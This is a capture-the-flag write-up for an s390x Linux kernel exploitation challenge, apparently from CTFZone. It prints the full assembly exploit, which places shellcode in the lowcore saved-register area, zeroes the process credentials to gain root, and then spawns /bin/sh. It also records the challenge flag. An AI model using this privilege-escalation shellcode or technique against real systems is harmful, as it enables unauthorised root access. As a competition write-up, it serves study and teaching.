# THREE NINETY GADGET

**Authors** [Nspace](https://twitter.com/_MatteoRizzo)

**Tags**: pwn, kernel, mainframe, s390

**Points**: 500 (1 solve)

> one_gadget? kone_gadget? [THREE NINETY GADGET!!!](https://ctf.bi.zone/files/three_ninety_gadget_824de25c9ea8a326964a4d1cb5c0e98ed2506416e13093334cc07dc69beb23d7.tar.xz) nc three_ninety_gadget.ctfz.one 390

## Analysis

This challenge is basically `kone_gadget` from SECCON 2021 (writeup [here](../../SECCON-2021/pwn/kone_gadget)) ported to s390x.

Like in the original challenge, the author patched the kernel to add a new syscall:

```c
SYSCALL_DEFINE1(s390_gadget, unsigned long, pc)
{
    register unsigned long r14 asm("14") = pc;
    asm volatile("xgr %%r0,%%r0\n"
             "xgr %%r1,%%r1\n"
             "xgr %%r2,%%r2\n"
             "xgr %%r3,%%r3\n"
             "xgr %%r4,%%r4\n"
             "xgr %%r5,%%r5\n"
             "xgr %%r6,%%r6\n"
             "xgr %%r7,%%r7\n"
             "xgr %%r8,%%r8\n"
             "xgr %%r9,%%r9\n"
             "xgr %%r10,%%r10\n"
             "xgr %%r11,%%r11\n"
             "xgr %%r12,%%r12\n"
             "xgr %%r13,%%r13\n"
             "xgr %%r15,%%r15\n"
             ".machine push\n"
             ".machine z13\n"
             "vzero %%v0\n"
             "vzero %%v1\n"
             "vzero %%v2\n"
             "vzero %%v3\n"
             "vzero %%v4\n"
             "vzero %%v5\n"
             "vzero %%v6\n"
             "vzero %%v7\n"
             "vzero %%v8\n"
             "vzero %%v9\n"
             "vzero %%v10\n"
             "vzero %%v11\n"
             "vzero %%v12\n"
             "vzero %%v13\n"
             "vzero %%v14\n"
             "vzero %%v15\n"
             "vzero %%v16\n"
             "vzero %%v17\n"
             "vzero %%v18\n"
             "vzero %%v19\n"
             "vzero %%v20\n"
             "vzero %%v21\n"
             "vzero %%v22\n"
             "vzero %%v23\n"
             "vzero %%v24\n"
             "vzero %%v25\n"
             "vzero %%v26\n"
             "vzero %%v27\n"
             "vzero %%v28\n"
             "vzero %%v29\n"
             "vzero %%v30\n"
             "vzero %%v31\n"
             ".machine pop\n"
             "br %0"
             : : "r" (r14));
    unreachable();
}
```

The custom syscall zeroes every general-purpose register and then jumps to an
address chosen by us. Somehow we have to use this to become root.

What makes this challenge difficult is that we have to write a kernel exploit for a fairly obscure architecture that no one on the team had seen before, and which is not supported by most of the tools we normally use (pwndbg, gef, vmlinux-to-elf, etc...).

## Exploitation

The first thing I tried was to replicate the solution we used for the original
challenge at SECCON. Unfortunately that doesn't work because the root filesystem
is no longer in an initramfs but in an ext2 disk. The flag is no longer in memory
and we would need to read from the disk first.

I also tried to use the intended solution for the original challenge (inject
shellcode in the kernel by using the eBPF JIT), but...

```
/ $ /pwn
seccomp: Function not implemented
```

it looks like the challenge kernel is compiled without eBPF or seccomp, so we
can't use that to inject shellcode either.

I also tried to load some shellcode in userspace, and then jump to it

```
[    4.215891] Kernel stack overflow.
[    4.216147] CPU: 1 PID: 43 Comm: pwn Not tainted 5.18.10 #1
[    4.216363] Hardware name: QEMU 3906 QEMU (KVM/Linux)
[    4.216532] Krnl PSW : 0704c00180000000 0000000001000a62 (0x1000a62)
[    4.216964]            R:0 T:1 IO:1 EX:1 Key:0 M:1 W:0 P:0 AS:3 CC:0 PM:0 RI:0 EA:3
[    4.217079] Krnl GPRS: 0000000000000000 0000000000000000 0000000000000000 0000000000000000
[    4.217140]            0000000000000000 0000000000000000 0000000000000000 0000000000000000
[    4.217196]            0000000000000000 0000000000000000 0000000000000000 0000000000000000
[    4.217251]            0000000000000000 0000000000000000 0000000001000a60 0000000000000000
[    4.218310] Krnl Code: 0000000001000a5c: 0000        illegal
[    4.218310]            0000000001000a5e: 0000        illegal
[    4.218310]           #0000000001000a60: 0000        illegal
[    4.218310]           >0000000001000a62: 0000        illegal
[    4.218310]            0000000001000a64: 0000        illegal
[    4.218310]            0000000001000a66: 0000        illegal
[    4.218310]            0000000001000a68: 0000        illegal
[    4.218310]            0000000001000a6a: 0000        illegal
[    4.218850] Call Trace:
[    4.219231]  [<00000000001144de>] show_regs+0x4e/0x80
[    4.219718]  [<000000000010196a>] kernel_stack_overflow+0x3a/0x50
[    4.219780]  [<0000000000000200>] 0x200
[    4.219958] Last Breaking-Event-Address:
[    4.219996]  [<0000000000000000>] 0x0
[    4.220445] Kernel panic - not syncing: Corrupt kernel stack, can't continue.
[    4.220652] CPU: 1 PID: 43 Comm: pwn Not tainted 5.18.10 #1
[    4.220727] Hardware name: QEMU 3906 QEMU (KVM/Linux)
[    4.220792] Call Trace:
[    4.220816]  [<00000000004ce1a2>] dump_stack_lvl+0x62/0x80
[    4.220879]  [<00000000004c4d16>] panic+0x10e/0x2d8
[    4.220933]  [<0000000000101980>] s390_next_event+0x0/0x40
[    4.220986]  [<0000000000000200>] 0x200
```

Unfortunately that didn't work either. At this point I started reading more about
the architecture that the challenge it's running on. I found [this page](https://www.kernel.org/doc/html/v5.3/s390/debugging390.html) from the
Linux kernel documentation, as well as IBM's manual useful.

As it turns out, on z/Architecture the kernel and userspace programs run in
completely different address spaces. Userspace memory is simply not accessible
from kernel mode without using special instructions and we cannot jump to
shellcode there.

At this point I was out of ideas and I started looking at the implementation of
Linux's system call handler for inspiration. One thing that I found interesting
is that the system call handler reads information such as the kernel stack
from a special page located at address zero. The structure of this special zero
page (lowcore) is described in [this Linux header file](https://elixir.bootlin.com/linux/latest/source/arch/s390/include/asm/lowcore.h).

Interestingly enough on this architecture, or at least on the version emulated by
QEMU, all memory is executable. Linux's system call handler even jumps to a
location in the zero page to return to userspace. If we could place some
controlled data somewhere, we could just jump to it to get arbitrary code
execution in the kernel.

At some point I started looking at the contents of the zero page in gdb and I
realized that there _is_ some memory that we could control there and use as
shellcode. For example `save_area_sync` at offset 0x200 contains the values of
registers r8-r15 before the system call. The values of those registers are completely
controlled by us in userspace. What if we placed some shellcode in the registers
and jumped to it? I used a very similar idea to solve [kernote](../../0CTF-2021-finals/pwn/kernote) from the 0CTF 2021 finals
except this time instead of merely using the saved registers as a ROP chain,
they're actually executable and we can use them to store actual shellcode!

We only have 64 bytes of space for the shellcode, which isn't a lot but should
be enough for a small snippet that gives us root and returns to userspace.

The zero page even contains a pointer to the current task, and we can use that
to find a pointer to our process's creds structure and zero the uid to get root.

Here is the full exploit:

```
.section .text
.globl _start
.type _start, @function
_start:
    larl %r5, shellcode
    lg %r8, 0(%r5)
    lg %r9, 8(%r5)
    lg %r10, 16(%r5)
    lg %r11, 24(%r5)
    lg %r12, 32(%r5)
    lg %r13, 40(%r5)
    lg %r14, 48(%r5)
    lg %r15, 56(%r5)
    lghi %r1, 390
    lghi %r2, 0x200
    svc 0

userret:
    # Launch a shell
    lghi %r1, 11
    larl %r2, binsh
    larl %r3, binsh_argv
    lghi %r4, 0
    svc 11

binsh:
    .asciz "/bin/sh"

binsh_argv:
    .quad binsh
    .quad 0

.align 16
shellcode:
    lg %r12, 0x340
    lg %r15, 0x348

    # Zero the creds
    lghi %r0, 0
    lg %r1, 0x810(%r12)
    stg %r0, 4(%r1)

    # Return to userspace
    lctlg %c1, %c1, 0x390
    stpt 0x2C8
    lpswe 0x200 + pswe - shellcode

.align 16
pswe:
    # Copied from gdb
    .quad 0x0705200180000000
    .quad userret
```

Flag: `CTFZone{pls_only_l0wcor3_m3th0d_n0__nintend3d_kthxbye}`